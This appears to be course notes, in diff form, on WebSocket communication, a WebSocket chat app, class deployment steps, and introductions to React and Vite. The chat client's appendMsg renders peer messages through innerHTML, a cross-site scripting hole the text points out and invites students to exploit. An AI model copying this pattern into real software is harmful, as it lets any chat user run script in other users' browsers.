+socket.send('I am listening');
+```
+
+The server uses the `ws` package to create a WebSocketServer that is listening on the same port the browser is using. By specifying a port when you create the WebSocketServer, you are telling the server to listen for HTTP connections on that port and to automatically upgrade them to a WebSocket connection if the request has a `connection: Upgrade` header.
+
+When a connection is detected it calls the server's `on connection` callback. The server can then send messages with the `send` function, and register a callback using the `on message` function to receive messages.
+
+```js
+const { WebSocketServer } = require('ws');
+
+const wss = new WebSocketServer({ port: 9900 });
+
+wss.on('connection', (ws) => {
+  ws.on('message', (data) => {
+    const msg = String.fromCharCode(...data);
+    console.log('received: %s', msg);
+
+    ws.send(`I heard you say "${msg}"`);
+  });
+
+  ws.send('Hello webSocket');
+});
+```
+
+In a later instruction we will show you how to run and debug this example.
+
+
+
+
+# Debugging WebSocket
+
+<a id="websocket-debug"></a>Debugging WebSocket:
+[go to top](#top)
+
+You can debug both sides of the WebSocket communication with VS Code to debug the server, and Chrome to debug the client. When you do this you will notice that Chrome's debugger has support specifically for working with WebSocket communication.
+
+![WebSocket debugger](webServicesWebSocketDebugger.jpg)
+
+## Debugging the server
+
+1. Create a directory named `testWebSocket` and change to that directory.
+1. Run `npm init -y`.
+1. Run `npm install ws`.
+1. Open VS Code and create a file named `main.js`. Paste the following code.
+
+   ```js
+   const { WebSocketServer } = require('ws');
+
+   const wss = new WebSocketServer({ port: 9900 });
+
+   wss.on('connection', (ws) => {
+     ws.on('message', (data) => {
+       const msg = String.fromCharCode(...data);
+       console.log('received: %s', msg);
+
+       ws.send(`I heard you say "${msg}"`);
+     });
+
+     ws.send('Hello webSocket');
+   });
+   ```
+
+1. Set breakpoints on the `ws.send` lines so you can inspect the code executing.
+1. Start debugging by pressing `F5`. The first time you may need to choose Node.js as the debugger.
+
+![WebSocket server debugging](webServicesWebSocketServerDebug.gif)
+
+## Debugging the client
+
+1. Open the Chrome debugger by pressing `F12`.
+1. Paste this code into the debugger console window and press enter to execute it. Executing this code will immediately hit the server breakpoint. Take a look at what is going on and then remove the breakpoint from the server.
+
+   ```js
+   const socket = new WebSocket('ws://localhost:9900');
+
+   socket.onmessage = (event) => {
+     console.log('received: ', event.data);
+   };
+   ```
+
+1. Select the `Network` tab and then select the HTTP message that was generated by the execution of the above client code.
+1. With the HTTP message selected, you then click the `Messages` tab to view the WebSocket messages
+1. Send a message to the server by executing the following in the debugger console window. This will cause the second server breakpoint to hit. Explore and then remove the breakpoint from the server.
+   ```js
+   socket.send('I am listening');
+   ```
+1. You should see the messages in the `Messages` debugger window.
+1. Send some more messages and observe the communication back and forth without stopping on the breakpoints.
+
+![WebSocket client debugging](webServicesWebSocketClientDebug.gif)
+
+
+
+
+# WebSocket chat
+
+<a id="websocket-chat"></a>WebSocket Chat:
+[go to top](#top)
+
+With the understanding of what WebSockets are, the basics of using them from Node and the browser, and the ability to debug the communication, it is time to use WebSocket to build a simple chat application.
+
+![WebSocket Peers](webServicesWebSocketPeers.jpg)
+
+In this example we will create an HTML page that uses WebSockets and displays the resulting chat. The server will forward the WebSocket communication from the different clients.
+
+## Chat client
+
+The HTML for the client provides an input for the user's name, an input for creating messages, and an element to display the messages that are sent and received.
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>WebSocket Chat</title>
+    <link rel="stylesheet" href="main.css" />
+  </head>
+  <body>
+    <div class="name">
+      <fieldset id="name-controls">
+        <legend>My Name</legend>
+        <input id="my-name" type="text" />
+      </fieldset>
+    </div>
+
+    <fieldset id="chat-controls" disabled>
+      <legend>Chat</legend>
+      <input id="new-msg" type="text" />
+      <button onclick="sendMessage()">Send</button>
+    </fieldset>
+    <div id="chat-text"></div>
+  </body>
+  <script src="chatClient.js"></script>
+</html>
+```
+
+The JavaScript for the application provides the interaction with the DOM for creating and displaying messages, and manages the WebSockets in order to connect, send, and receive messages.
+
+### DOM interaction
+
+We do not want to be able to send messages if the user has not specified a name. So we add an event listener on the name input and disable the chat controls if the name ever is empty.
+
+```js
+const chatControls = document.querySelector('#chat-controls');
+const myName = document.querySelector('#my-name');
+myName.addEventListener('keyup', (e) => {
+  chatControls.disabled = myName.value === '';
+});
+```
+
+We then create a function that will update the displayed messages by selecting the element with the `chat-text` ID and appending the new message to its HTML. Security-minded developers will realize that manipulating the DOM in this way will allow any chat user to execute code in the context of the application. After you get everything working, if you are interested, see if you can exploit this weakness.
+
+```js
+function appendMsg(cls, from, msg) {
+  const chatText = document.querySelector('#chat-text');
+  chatText.innerHTML = `<div><span class="${cls}">${from}</span>: ${msg}</div>` + chatText.innerHTML;
+}
+```
+
+When a user presses the enter key in the message input we want to send the message over the socket. We do this by selecting the DOM element with the `new-msg` ID and adding a listener that watches for the `Enter` keystroke.
+
+```js
+const input = document.querySelector('#new-msg');
+input.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') {
+    sendMessage();
+  }
+});
+```
+
+When Enter is pressed the sendMessage function is called. This selects the text out of the `new-msg` element and the name out of the `my-name` element and sends that over the WebSocket. The value of the message element is then cleared so that it is ready for the next message.
+
+```js
+function sendMessage() {
+  const msgEl = document.querySelector('#new-msg');
+  const msg = msgEl.value;
+  if (!!msg) {
+    appendMsg('me', 'me', msg);
+    const name = document.querySelector('#my-name').value;
+    socket.send(`{"name":"${name}", "msg":"${msg}"}`);
+    msgEl.value = '';
+  }
+}
+```
+
+### WebSocket connection
+
+Now we can set up our WebSocket. We want to be able to support both secure and non-secure WebSocket connections. To do this we look at the protocol that is currently being used as represented by the `window.location.protocol` variable. If it is non-secure HTTP then we set our WebSocket protocol to be non-secure WebSocket (`ws`). Otherwise we use secure WebSocket (`wss`). We use that to then connect the WebSocket to the same location that we loaded the HTML from by referencing the `window.location.host` variable.
+
+We can notify the user that chat is ready to go by listening to the `onopen` event and appending some text to the display using the `appendMsg` function we created earlier.
+
+```js
+// Adjust the webSocket protocol to what is being used for HTTP
+const protocol = window.location.protocol === 'http:' ? 'ws' : 'wss';
+const socket = new WebSocket(`${protocol}://${window.location.host}/ws`);
+
+// Display that we have opened the webSocket
+socket.onopen = (event) => {
+  appendMsg('system', 'websocket', 'connected');
+};
+```
+
+When the WebSocket receives a message from a peer it displays it using the `appendMsg` function.
+
+```js
+socket.onmessage = async (event) => {
+  const text = await event.data.text();
+  const chat = JSON.parse(text);
+  appendMsg('friend', chat.name, chat.msg);
+};
+```
+
+And if the WebSocket closes for any reason we also display that to the user and disable the controls.
+
+```js
+socket.onclose = (event) => {
+  appendMsg('system', 'websocket', 'disconnected');
+  document.querySelector('#name-controls').disabled = true;
+  document.querySelector('#chat-controls').disabled = true;
+};
+```
+
+## Chat server
+
+The chat server runs the web service, serves up the client code, manages the WebSocket connections, and forwards messages from the peers.
+
+### Web service
+
+The web service is established using a simple Express application. Note that we serve up our client HTML, CSS, and JavaScript files using the `static` middleware.
+
+```js
+const { WebSocketServer } = require('ws');
+const express = require('express');
+const app = express();
+
+// Serve up our webSocket client HTML
+app.use(express.static('./public'));
+
+const port = process.argv.length > 2 ? process.argv[2] : 3000;
+server = app.listen(port, () => {
+  console.log(`Listening on ${port}`);
+});
+```
+
+### WebSocket server
+
+When we create our WebSocket we do things a little differently than we did with the simple connection example. Instead of letting the WebSocketServer control both the HTTP connection and the upgrading to WebSocket, we want to use the HTTP connection that Express is providing and handle the upgrade to WebSocket ourselves. This is done by specifying the `noServer` option when creating the WebSocketServer and then handling the `upgrade` notification that occurs when a client requests the upgrade of the protocol from HTTP to WebSocket.
+
+```js
+// Create a websocket object
+const wss = new WebSocketServer({ noServer: true });
+
+// Handle the protocol upgrade from HTTP to WebSocket
+server.on('upgrade', (request, socket, head) => {
+  wss.handleUpgrade(request, socket, head, function done(ws) {
+    wss.emit('connection', ws, request);
+  });
+});
+```
+
+### Forwarding messages
+
+With the WebSocket server we can use the `connection`, `message`, and `close` events to forward messages between peers. On connection we insert an object representing the connection into a list of all connections from the chat peers. Then when a message is received we loop through the peer connections and forward it on to everyone except the peer who initiated the request. Finally we remove a connection from the peer connection list when it is closed.
+
+```js
+// Keep track of all the connections so we can forward messages
+let connections = [];
+
+wss.on('connection', (ws) => {
+  const connection = { id: connections.length + 1, alive: true, ws: ws };
+  connections.push(connection);
+
+  // Forward messages to everyone except the sender
+  ws.on('message', function message(data) {
+    connections.forEach((c) => {
+      if (c.id !== connection.id) {
+        c.ws.send(data);
+      }
+    });
+  });
+
+  // Remove the closed connection so we don't try to forward anymore
+  ws.on('close', () => {
+    connections.findIndex((o, i) => {
+      if (o.id === connection.id) {
+        connections.splice(i, 1);
+        return true;
+      }
+    });
+  });
+});
+```
+
+### Keeping connections alive
+
+A WebSocket connection will eventually close automatically if no data is sent across it. In order to prevent that from happening the WebSocket protocol supports the ability to send a `ping` message to see if the peer is still there and receive `pong` responses to indicate the affirmative.
+
+It make this work we use `setInterval` to send out a ping every 10 seconds to each of our peer connections and clean up any connections that did not response to our previous ping.
+
+```js
+setInterval(() => {
+  connections.forEach((c) => {
+    // Kill any connection that didn't respond to the ping last time
+    if (!c.alive) {
+      c.ws.terminate();
+    } else {
+      c.alive = false;
+      c.ws.ping();
+    }
+  });
+}, 10000);
+```
+
+In our `connection` handler we listen for the `pong` response and mark the connection as alive.
+
+```js
+// Respond to pong messages by marking the connection alive
+ws.on('pong', () => {
+  connection.alive = true;
+});
+```
+
+Any connection that did not respond will remain in the not alive state and get cleaned up on the next pass.
+
+# Experiment
+
+You can find the complete example described above in this [GitHub repository](https://github.com/webprogramming260/websocket-chat).
+
+1. Clone the repository.
+1. Run `npm install` from a console window in the example directory.
+1. Open up the code in VS Code and review what it is doing.
+1. Run and debug the example by pressing `F5`. You may need to select node.js as the debugger the first time you run.
+1. Open multiple browser windows and point them to http://localhost:3000 and start chatting.
+1. Use the browser's debugger to view the WebSocket communication.
+
+
+
+
+# Simon WebSocket
+
+<a id="simon-websocket"></a>Simon WebSocket:
+[go to top](#top)
+
+🎥 **Instruction video**: [Simon WebSocket](https://youtu.be/oVO2VIG0zfI)
+
+![Simon](../simon.png)
+
+This deliverable demonstrates peer-to-peer communication using WebSocket. The functionality that Simon provides for peer communication is intentionally limited to display notifications between users. This was done so that the application would clearly demonstrate how WebSocket works rather than clutter the application with functionality that uses WebSockets.
+
+You can view this application running here: [Example Simon WebSocket](https://simon-websocket.cs260.click)
+
+## Handling WebSocket requests
+
+After installing the `ws` NPM package the next step is to attach a WebSocket listener to the HTTP server that was created in an earlier deliverable. This work is all done in the PeerProxy class implemented in the `peerProxy.js` file. The PeerProxy class contains the protocol upgrade from HTTP to WebSocket, tracks new WebSocket connections, passes (or proxies) requests between connections, and implements ping/pong to keep connections alive.
+
+## Displaying and generating WebSocket messages
+
+The `public/play.js` file contains the functions for connecting, broadcasting, receiving, and displaying events using WebSocket.
+
+![Simon WebSocket](simonWebSocket.jpg)
+
+Leveraging the concepts demonstrated in this deliverable, you can implement additional functionality that uses peer-to-peer interactions. For example, you could make it so each connected peer has to complete one of the Simon patterns in turn.
+
+## Study this code
+
+Get familiar with what this code teaches.
+
+- Clone the repository to your development environment.
+  ```sh
+  git clone https://github.com/webprogramming260/simon-websocket.git
+  ```
+- Set up your Atlas credentials in a file named `dbConfig.json` that is in the same directory as `database.js`.
+- Add `dbConfig.json` to your `.gitignore` file so that it doesn't put your credentials into GitHub accidentally.
+- Review the code and get comfortable with everything it represents.
+- Debug the code in your browser by hosting it from a VS Code debug session. This [video on debugging a node.js based service](https://youtu.be/B0le_Z_2TQY) will step you through the process.
+
+  ⚠ You will no longer use the `live server` extension to launch your frontend code in the browser since your frontend code will now be served up by the Node.js server you created in `index.js`. Set breakpoints in your backend code inside of Visual Studio.
+
+- Use the browser's dev tools to set breakpoints in the code and step through it each line.
+- Make modifications to the code as desired. Experiment and see what happens.
+
+## Deploy to production
+
+- Deploy to your production environment using a copy of the `deployService.sh` script found in the [example class application](https://github.com/webprogramming260/simon-websocket/blob/main/deployService.sh). Take some time to understand how it works.
+
+  ```sh
+  ./deployService.sh -k <yourpemkey> -h <yourdomain> -s simon
+  ```
+
+  For example,
+
+  ```sh
+  ./deployService.sh -k ~/keys/production.pem -h yourdomain.click -s simon
+  ```
+
+- Update your `startup` repository notes.md with what you learned.
+- Make sure your project is visible from your production environment (e.g. https://simon.yourdomain.click).
+
+
+
+
+# Startup WebSocket
+
+<a id="startup-websocket"></a>Startup WebSocket:
+[go to top](#top)
+
+Now that you have learned how to use WebSocket network connections, it is time to add it to your startup application. The main things you should focus on in this deliverable include listening for a connection on your backend, making a connection from your frontend, sending messages between the two, and displaying the result in your application.
+
+You must use the same startup GitHub repository that you created in the earlier instruction. Update the notes.md file with things that you learn as you work on your startup. As you make changes to your HTML, CSS, and JavaScript commit those changes and push them to GitHub. You will need at least four commits to get full credit, but in reality you should have many more than that.
+
+Remember to use the browser's debugger window to debug your frontend HTML, CSS and JavaScript. You can also debug your backend service JavaScript running on Node.js using the built in VS Code Node.js debugger.
+
+Once you have developed your application to where you want it, you need to release it to your production environment. Usethe `deployService.sh` script from the [Simon WebSocket repository](https://github.com/webprogramming260/simon-websocket/blob/main/deployService.sh) and use `startup` for the service parameter (`-s`).
+
+```sh
+./deployService.sh -k <yourpemkey> -h <yourdomain> -s startup
+```
+
+For example,
+
+```sh
+./deployService.sh -k ~/keys/production.pem -h yourdomain.click -s startup
+```
+
+Doing this will make this deliverable of your startup available from `https://startup.yourdomainname`.
+
+## ☑ Assignment
+
+1. Review and deploy Simon WebSocket
+   1. Clone the Simon WebSocket repository to your development environment.
+   1. Run `npm install` in root of the project.
+   1. Open the project in VS Code and examine the application's use of JavaScript to support WebSocket communication.
+   1. Create and configure the `dbConfig.json` file with your MongoDB credentials.
+   1. Execute in your development environment by debugging the application using VS Code's Node.js debugger (press F5 while viewing index.js). Set breakpoints in VS Code and step through the backend JavaScript related to WebSocket communication.
+   1. Open your browser to https://localhost:3000 and use the browser's dev tools to step through the frontend JavaScript using the Source tab.
+   1. Deploy to your production environment using the deployment script so that it is available with your domain's `simon` subdomain.
+1. Listen for WebSocket requests on your backend.
+1. Connect the WebSocket from your frontend.
+1. Send messages over your WebSocket connection.
+1. Connect your WebSocket functionality to your application interface.
+1. Make sure your name is displayed in the application and that there is a link to your GitHub repository.
+1. Periodically commit and push your code to GitHub.
+1. Periodically update your startup repository's notes.md file to reflect what you have learned and want to remember.
+1. Push your final version of your project to GitHub.
+1. Deploy your startup application to your production environment (your server).
+1. Make sure your application is available from your production environment.
+1. Upload the URL to your startup application to the Canvas assignment.
+
+## Grading Rubric
+
+- (Required) Simon WebSocket deployed to your production environment
+- (Required) A link to your GitHub startup repository prominently displayed on your application's home page
+- (Required) Notes in your startup Git repository README.md file documenting what you modified and added with this deliverable. The TAs will only grade things that have been clearly described as being completed. Review the [voter app](https://github.com/webprogramming260/startup-example) as an example.
+- WebSocket support for data pushed from the backend
+  - 20% - Backend listens for WebSocket connection
+  - 20% - Frontend makes WebSocket connection
+  - 20% - Data sent over WebSocket connection
+  - 30% - WebSocket data displayed in the application interface
+- 10% - Multiple Git commits with meaningful comments.
+
+## Go celebrate
+
+You did it! This is a significant milestone. Time to grab some friends, show them what you did, and celebrate by eating some cheese 🧀.
+
+
+
+
+
+# Web Frameworks:
+
+
+
+
+
+# Web frameworks
+
+<a id="web-frameworks-intro"></a>Web frameworks:
+[go to top](#top)
+
+📖 **Deeper dive reading**: [MDN Introduction to client-side frameworks](https://developer.mozilla.org/en-US/docs/Learn/Tools_and_testing/Client-side_JavaScript_frameworks/Introduction)
+
+Web frameworks seek to make the job of writing web applications easier by providing tools for completing common application tasks. This includes things like modularizing code, creating single page applications, simplifying reactivity, and supporting diverse hardware devices.
+
+Some frameworks take things beyond the standard web technologies (HTML, CSS, JavaScript) and create new hybrid file formats that combine things like HTML and JavaScript into a single file. Examples of this include React JSX, Vue SFC, and Svelte files. Abstracting away the core web file formats puts the focus on functional components rather than files.
+
+There are lots of web frameworks to choose from and they evolve all the time. You can view the latest popularity poll at [StateOfJS](https://stateofjs.com).
+
+![web frameworks](stateofjs-webframeworks.jpg)
+
+\- **Source**: _StateOfJS web framework poll_
+
+Each framework has advantages and disadvantages. Some are very prescriptive (opinionated) about how to do things, some have major institutional backing, and others have a strong open source community. Other factors you want to consider include how easy it is to learn, how it impacts productivity, how performant it is, how long it takes to build, and how actively the framework is evolving.
+
+## Hello world examples
+
+For our classwork we will use the web framework React. However, before we dig into React let's look at how the major frameworks would render a simple hello world application.
+
+### Vue
+
+[Vue](https://vuejs.org/) combines HTML, CSS, and JavaScript into a single file. HTML is represented by a `template` element that can be aggregated into other templates.
+
+**SFC**
+
+```html
+<script>
+  export default {
+    data() {
+      return {
+        name: 'world',
+      };
+    },
+  };
+</script>
+
+<style>
+  p {
+    color: green;
+  }
+</style>
+
+<template>
+  <p>Hello {{ name }}!</p>
+</template>
+```
+
+### Svelte
+
+Like Vue, [Svelte](https://svelte.dev/) combines HTML, CSS, and JavaScript into a single file. The difference here is that Svelte requires a transpiler to generate browser-ready code, instead of a runtime virtual DOM.
+
+**Svelte file**
+
+```html
+<script>
+  let name = 'world';
+</script>
+
+<style>
+  p {
+    color: green;
+  }
+</style>
+
+<p>Hello {name}!</p>
+```
+
+### React
+
+React combines JavaScript and HTML into its component format. CSS must be declared outside of the JSX file. The component itself highly leverages the functionality of JavaScript and can be represented as a function or class.
+
+**JSX**
+
+```jsx
+import 'hello.css';
+
+const Hello = () => {
+  let name = 'world';
+
+  return <p>Hello {name}</p>;
+};
+```
+
+**CSS**
+
+```css
+p {
+  color: green;
+}
+```
+
+### Angular component
+
+An Angular component defines what JavaScript, HTML, and CSS are combined together. This keeps a fairly strong separation of files that are usually grouped together in a directory rather than using the single file representation.
+
+**JS**
+
+```js
+@Component({
+  selector: 'app-hello-world',
+  templateUrl: './hello-world.component.html',
+  styleUrls: ['./hello-world.component.css'],
+})
+export class HelloWorldComponent {
+  name: string;
+  constructor() {
+    this.name = 'world';
+  }
+}
+```
+
+**HTML**
+
+```html
+<p>hello {{name}}</p>
+```
+
+**CSS**
+
+```css
+p {
+  color: green;
+}
+```
+
+
+
+
+# React
+
+<a id="react-intro"></a>React:
+[go to top](#top)
+
+![React Logo](reactLogo.png)
+
+🎥 **Instruction video**: [React introduction](https://youtu.be/R2I89JGr2TM)
+
+📖 **Recommended reading**:
+
+- [MDN React Introduction Tutorial](https://developer.mozilla.org/en-US/docs/Learn/Tools_and_testing/Client-side_JavaScript_frameworks/React_getting_started)
+- [React Quick Start](https://react.dev/learn#components)
+
+React, and its associated projects, provide a powerful web programming framework. The name React comes from its focus on making reactive web page components that automatically update based on user interactions or changes in the underlying data.
+
+![Jordan Walke](jordanWalke.jpg)
+
+> “The best drug is getting little things done that have been weighing on you. Instant high.”
+>
+> — Jordan Walke (_Source_: [Twitter](https://twitter.com/jordwalke/status/1554625863089418243?cxt=HHwWhsCjgYv_kZMrAAAA))
+
+React was created by Jordan Walke for use at Facebook in 2011. It was first used with Facebook's news feed and then as the main framework for Instagram. Shortly thereafter, Facebook open sourced the framework and it was quickly adopted by many popular web applications.
+
+React abstracts HTML into a JavaScript variant called [JSX](https://reactjs.org/docs/introducing-jsx.html). JSX is converted into valid HTML and JavaScript using a preprocessor called [Babel](https://babeljs.io/). For example, the following is a JSX file. Notice that it mixes both HTML and JavaScript into a single representation.
+
+```jsx
+const i = 3;
+const list = (
+  <ol class='big'>
+    <li>Item {i}</li>
+    <li>Item {3 + i}</li>
+  </ol>
+);
+```
+
+Babel will convert that into valid JavaScript:
+
+```js
+const i = 3;
+const list = React.createElement(
+  'ol',
+  { class: 'big' },
+  React.createElement('li', null, 'Item ', i),
+  React.createElement('li', null, 'Item ', 3 + i)
+);
+```
+
+The `React.createElement` function will then generate DOM elements and monitor the data they represent for changes. When a change is discovered, React will trigger dependent changes.
+
+
+
+# Components
+
+<a id="react-components"></a>React components:
+[go to top](#top)
+
+📖 **Recommended reading**: [React.dev - Your First Component](https://react.dev/learn/your-first-component)
+
+React components allow you to modularize the functionality of your application. This allows the underlying code to directly represent the components that a user interacts with. It also enables code reuse as common application components often show up repeatedly.
+
+## The render function
+
+One of the primary purposes of a component is to generate the user interface. This is done with the component's `render` function. Whatever is returned from the `render` function is inserted into the component HTML element.
+
+As a simple example, a JSX file containing a React component element named `Demo` would cause React to load the `Demo` component, call the `render` function, and insert the result into the place of the `Demo` element.
+
+**JSX**
+
+```jsx
+<div>
+  Component: <Demo />
+</div>
+```
+
+Notice that `Demo` is not a valid HTML element. The transpiler will replace this tag with the resulting rendered HTML.
+
+**React component**
+
+```js
+function Demo() {
+  const who = 'world';
+  return <b>Hello {who}</b>;
+}
+```
+
+**Resulting HTML**
+
+```html
+<div>Component: <b>Hello world</b></div>
+```
+
+## Properties
+
+React components also allow you to pass information to them in the form of element properties. The component receives the properties in its constructor and then can display them when it renders.
+
+**JSX**
+
+```jsx
+<div>Component: <Demo who="Walke" /><div>
+```
+
+**React component**
+
+```jsx
+function Demo(props) {
+  return <b>Hello {props.who}</b>;
+}
+```
+
+**Resulting HTML**
+
+```html
+<div>Component: <b>Hello Walke</b></div>
+```
+
+## State
+
+In addition to properties, a component can have internal state. Component state is created by calling the `React.useState` hook function. The `useState` function returns a variable that contains the current state and a function to update the state. The following example creates a state variable called `clicked` and toggles the click state in the `updateClicked` function that gets called when the paragraph text is clicked.
+
+```jsx
+const Clicker = () => {
+  const [clicked, updateClicked] = React.useState(false);
+
+  const onClicked = (e) => {
+    updateClicked(!clicked);
+  };
+
+  return <p onClick={(e) => onClicked(e)}>clicked: {`${clicked}`}</p>;
+};
+
+const root = ReactDOM.createRoot(document.getElementById('root'));
+root.render(<Clicker />);
+```
+
+You should note that you can use JSX even without a function. A simple variable representing JSX will work anyplace you would otherwise provide a component.
+
+```jsx
+const hello = <div>Hello</div>;
+
+ReactDOM.render(hello, document.getElementById('root'));
+```
+
+## Class style components
+
+In addition to the preferred `function style` components demonstrated above, React also supports `class style` components. However, you should note that the React team is moving away from the class style representation, and for that reason you should probably not use it. With that said, you are likely to see class style components and so you should be aware of the syntax. Below is the equivalent class style component for the `Clicker` component that we created above.
+
+The major difference is that properties are loaded on the constructor and state is set using a `setState` function on the component object.
+
+```jsx
+class Clicker extends React.Component {
+  constructor(props) {
+    super(props);
+    this.state = {
+      clicked: false,
+    };
+  }
+  onClicked() {
+    this.setState({
+      clicked: !this.state.clicked,
+    });
+  }
+  render() {
+    return <p onClick={(e) => this.onClicked(e)}>clicked: {`${this.state.clicked}`}</p>;
+  }
+}
+
+const root = ReactDOM.createRoot(document.getElementById('root'));
+root.render(<Clicker />);
+```
+
+## Reactivity
+
+A component's properties and state are used by the React framework to determine the reactivity of the interface. Reactivity controls how a component reacts to actions taken by the user or events that happen within the application. Whenever a component's state or properties change, the `render` function for the component and all of its dependent component `render` functions are called.
+
+## ☑ Assignment
+
+Create a fork of this [CodePen](https://codepen.io/leesjensen/pen/Yzvaver) and experiment.
+
+Try the following:
+
+1. Add a new property to the Demo component that provides the background color for the component.
+2. Add another state variable that changes the color on a mouse over event.
+
+When you are done submit your CodePen URL to the Canvas assignment.
+
+### 🧧 Possible solution
+
+If you get stuck here is a possible solution.
+
+```jsx
+function App() {
+  return (
+    <div>
+      Function Style Component: <Demo who='function' color='yellow' />
+    </div>
+  );
+}
+
+const Demo = ({ who, initialColor }) => {
+  const [color, setColor] = React.useState(initialColor);
+  const [outlook, setOutlook] = React.useState('beautiful');
+
+  function changeOutlook() {
+    setOutlook(outlook === 'exciting' ? 'beautiful' : 'exciting');
+  }
+
+  function changeColor() {
+    var randomColor = Math.floor(Math.random() * 16777215).toString(16);
+    setColor('#' + randomColor);
+  }
+
+  return (
+    <div className='component' onMouseOver={changeColor} style={{ background: color }}>
+      <p>
+        Hello {outlook} {who}
+      </p>
+      <button onClick={changeOutlook}>change</button>
+    </div>
+  );
+};
+```
+
+
+
+# Toolchains
+
+<a id="react-toolchains"></a>React toolchains:
+[go to top](#top)
+
+As web programming becomes more and more complex it became necessary to abstract away some of that complexity with a series of tools. Some common functional pieces in a web application tool chain include:
+
+- **Code repository** - Stores code in a shared, versioned, location.
+- **Linter** - Removes, or warns, of non-idiomatic code usage.
+- **Prettier** - Formats code according to a shared standard.
+- **Transpiler** - Compiles code into a different format. For example, from JSX to JavaScript, TypeScript to JavaScript, or SCSS to CSS.
+- **Polyfill** - Generates backward compatible code for supporting old browser versions that do not support the latest standards.
+- **Bundler** - Packages code into bundles for delivery to the browser. This enables compatibility (for example with ES6 module support), or performance (with lazy loading).
+- **Minifier** - Removes whitespace and renames variables in order to make code smaller and more efficient to deploy.
+- **Testing** - Automated tests at multiple levels to ensure correctness.
+- **Deployment** - Automated packaging and delivery of code from the development environment to the production environment.
+
+The toolchain that we use for our React project consists of [GitHub](https://github.com/) as the code repository, [Vite](https://vitejs.dev/) for JSX, TS, development and debugging support, [ESBuild](https://esbuild.github.io/) for converting to ES6 modules and transpiling (with [Babel](https://babeljs.io/docs/en/) underneath), [Rollup](https://rollupjs.org/) for bundling and tree shaking, [PostCSS]() for CSS transpiling, and finally a simple bash script (deployReact.sh) for deployment.
+
+You don't have to fully understand what each of these pieces in the chain are accomplishing, but the more you know about them the more you can optimize your development efforts.
+
+In the following instruction we will show you how to use Vite to create a simple web application using the tools mentioned above. We will then demonstrate how to convert your startup into a modern web application by converting Simon to use Vite and React.
+
+
+
+# Vite
+
+<a id="vite"></a>Vite:
+[go to top](#top)
+
+📖 **Deeper dive reading**: [Vite](https://vitejs.dev/guide/)
+
+Now that we have covered the basics of React, we want to extend our usage to include a full web framework toolchain that allows us to use JSX, minification, polyfills, and bundling for our Simon and startup applications. One common way for configuring your project to take advantage of these technologies is to use a Command Line Interface (CLI) to initially set up a web application. Using a CLI saves you the trouble of configuring the toolchain parameters and gets you quickly started with a default application.
+
+For our toolchain we are going to use [Vite](https://vitejs.dev/). Vite bundles your code quickly, has great debugging support, and allows you to easily support JSX, TypeScript, and different CSS flavors. To get started with Vite, let's first build a simple web application. Later we will convert Simon over to React using Vite. This will teach you what you need to know in order to move your startup to React.
+
+To create a new React-based web application using Vite, open your console and run the following commands:
+
+```sh
+npm create vite@latest demoVite -- --template react
+cd demoVite
+npm install
+npm run dev
+```
+
+This will create a new web application in the `demoVite` directory, download the required 3rd party packages, and start up the application using a local HTTP debugging server. You can tell Vite to open your browser to the URL that is hosting your application by pressing `o`, or press `h` to see all of the Vite CLI options.
+
+![Vite Demo](viteDemo.gif)
+
+Congratulations! You have just created your first React-enabled web application.
+
+Once you have played around with the application in your browser, you can return to your console and stop Vite from hosting the application by pressing `q`.
+
+## Generated project
+
+Now, let's explore the application files that Vite created. From the console, use VS Code (`code .`) to open the project directory and take a look at the files.
+
+| Directory    | File              | Purpose                                                                                                                   |
+| ------------ | ----------------- | ------------------------------------------------------------------------------------------------------------------------- |
+| ./           |                   |                                                                                                                                |
+|              | index.html        | Primary page for the application. This is the starting point to load all of the JSX components beginning with `main.jsx`. |
+|              | package.json      | NPM definition for package dependencies and script commands. This is what maps `npm run dev` to actually start up Vite.   |
+|              | package-lock.json | Version constraints for included packages (do not edit this).                                                             |
+|              | vite.config.js    | Configuration setting for Vite. Specifically this sets up React for development.                                          |
+| ./public     |                   |                                                                                                                           |
+|              | vite.svg          | Vite logo for use as favicon and for display in the app.                                                                  |
+| ./src        |                   |                                                                                                                           |
+|              | main.jsx          | Entry point for code execution. This simply loads the App component found in `App.jsx`.                                   |
+|              | index.css         | CSS for the entire application.                                                                                           |
+|              | App.jsx           | JSX for top level application component. This displays the logs and implements the click counter.                         |
+|              | App.css           | CSS for the top level application component.                                                                              |
+| ./src/assets |                   |                                                                                                                           |
+|              | react.svg         | React logo for display in the app.                                                                                        |
+
+The main files in the application are `index.html`, `main.jsx`, and `App.jsx`. The browser loads `index.html` which provides the HTML element (`#root`) that the React application will be injected into. It also includes the script element to load `main.jsx`.
+
+`main.jsx` creates the React application by associating the `#root` element with the `App` component found in `App.jsx`. This causes all of the component render functions to execute and the generated HTML, CSS, and JavaScript to be executed in `index.html`.
+
+![File relationship](reactFiles.png)
+
+## JSX vs JS
+
+The `Vite` CLI uses the `.jsx` extension for JSX files instead of the JavaScript `.js` extension. The Babel transpiler will work with either one, but some editor tools will work differently based upon the extension. For this reason, you should prefer `.jsx` for files that contain JSX. The developers at AirBNB had an interesting [conversation](https://github.com/airbnb/javascript/pull/985) on this topic that you might browse if you would like to consider the differing opinions on this subject.
+
+## Building a production release
+
+When you execute `npm run dev` you are bundling the code to a temporary directory that the Vite debug HTTP server loads from. When you want to bundle your application so that you can deploy to a production environment you need to run `npm run build`. This executes the `build` script found in your `package.json` and invokes the `Vite` CLI. `vite build` transpiles, minifies, injects the proper JavaScript, and then outputs everything to a deployment-ready version contained in a distribution subdirectory named `dist`.
+
+```sh
+➜  npm run build
+
+> demovite@0.0.0 build
+> vite build
+
+vite v4.3.7 building for production...
+✓ 34 modules transformed.
+dist/index.html                   0.45 kB │ gzip:  0.30 kB
+dist/assets/react-35ef61ed.svg    4.13 kB │ gzip:  2.14 kB
+dist/assets/index-51439b3f.css    1.42 kB │ gzip:  0.74 kB
+dist/assets/index-58d24859.js   143.42 kB │ gzip: 46.13 kB
+✓ built in 382ms
+```
+
+## Deploying a production release
+
+The deployment script for Simon React (`deployReact.sh`) creates a production distribution by calling `npm run build` and then copying the resulting `dist` directory to your production server.
+
+Take some time to build a production release by running `npm run build`. Then examine what Vite actually builds by examining the `dist` directory. For example, if you look at the `dist/assets` directory you will see the bundled and minified JavaScript and CSS files.
+
+## ☑ Assignment
+
